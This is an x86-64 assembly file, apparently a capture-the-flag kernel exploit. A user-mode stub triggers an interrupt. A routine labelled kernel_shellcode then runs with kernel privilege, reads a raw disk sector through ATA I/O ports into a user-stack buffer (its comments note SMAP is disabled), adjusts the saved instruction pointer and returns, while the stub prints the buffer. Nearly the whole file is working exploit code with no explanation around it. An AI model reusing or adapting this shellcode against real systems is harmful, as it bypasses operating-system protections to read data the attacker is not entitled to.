        .intel_syntax noprefix
        .text

        .global _start


_start:
        int3

        mov rdi, 0x1
        mov rsi, 0x7fffffffa000 + 0x20
        mov rdx, 0x40
        mov rax, 0x1
        syscall
        mov rax, 0x3d
        mov rdi, 0x0
        syscall
        ud2

kernel_shellcode:
        push r11
        push r10
        push r9
        push r8
        push rdi
        push rsi
        push rdx
        push rcx
        push rbx
        push rax

        // jump here kernel
        // cylinder, head, sector
        mov ebx, 1
        // how many sectors (= 512 bytes)
        mov ch, 1

        // user stack (smap disabled)
        mov rdi, 0x7fffffffa000 + 0x20

        call ata_chs_read

        // Increment ip
        mov rdi, rsp
        add rdi, 0x58
        mov rax, qword ptr [rdi]
        add rax, 0x1
        mov qword ptr [rdi], rax

        pop rax
        pop rbx
        pop rcx
        pop rdx
        pop rsi
        pop rdi
        pop r8
        pop r9
        pop r10
        pop r11
        pop rax
        iretq

        ud2

        // copied from osdev
ata_chs_read:
        pushfq
        push rax
        push rbx
        push rcx
        push rdx
        push rdi

        mov rdx, 0x1f6            // port to send drive & head numbers
        mov al,bh               // head index in BH
        and al, 0b00001111        // head is only 4 bits long
        or  al, 0b10100000        // default 1010b in high nibble
        out dx,al

        mov rdx, 0x1f2            // Sector count port
        mov al, ch               // Read CH sectors
        out dx, al

        mov rdx, 0x1f3            // Sector number port
        mov al, bl               // BL is sector index
        out dx, al

        mov rdx, 0x1f4            // Cylinder low port
        mov eax, ebx             // byte 2 in ebx, just above BH
        mov cl, 16
        shr eax, cl              // shift down to AL
        out dx, al

        mov rdx, 0x1f5            // Cylinder high port
        mov eax, ebx             // byte 3 in ebx, just above byte 2
        mov cl, 24
        shr eax, cl              // shift down to AL
        out dx, al

        mov rdx, 0x1f7            // Command port
        mov al, 0x20              // Read with retry.
        out dx, al

.still_going:
        in al, dx
        test al, 8               // the sector buffer requires servicing.
        jnz .ok
        jz .still_going         // until the sector buffer is ready.
        // mov r8, 0xdeadd0d0
.ok:

        mov rax, 512/2           // to read 256 words = 1 sector
        xor bx, bx
        mov bl, ch               // read CH sectors
        mul bx
        mov rcx, rax             // RCX is counter for INSW
        mov rdx, 0x1f0            // Data port, in and out
        rep insw                // in to [RDI]

        pop rdi
        pop rdx
        pop rcx
        pop rbx
        pop rax
        popfq
        ret
